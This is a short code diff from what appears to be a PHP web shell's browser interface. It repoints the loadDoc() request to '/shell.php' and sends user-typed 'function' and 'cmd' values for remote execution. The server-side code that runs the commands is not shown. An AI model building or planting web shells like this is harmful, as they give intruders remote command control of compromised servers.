@@ -72,7 +72,7 @@ function loadDoc() {
      document.getElementById('results').scrollTop = document.getElementById('results').scrollHeight;
     }
   };
-  xhttp.open("GET", "<?php echo __FILE__; ?>?function="+encodeURIComponent(document.getElementById('function').value)+"&cmd="+encodeURIComponent(document.getElementById('cmd').value), true);
+  xhttp.open("GET", "/shell.php?function="+encodeURIComponent(document.getElementById('function').value)+"&cmd="+encodeURIComponent(document.getElementById('cmd').value), true);
   xhttp.send();
 }
 </script>
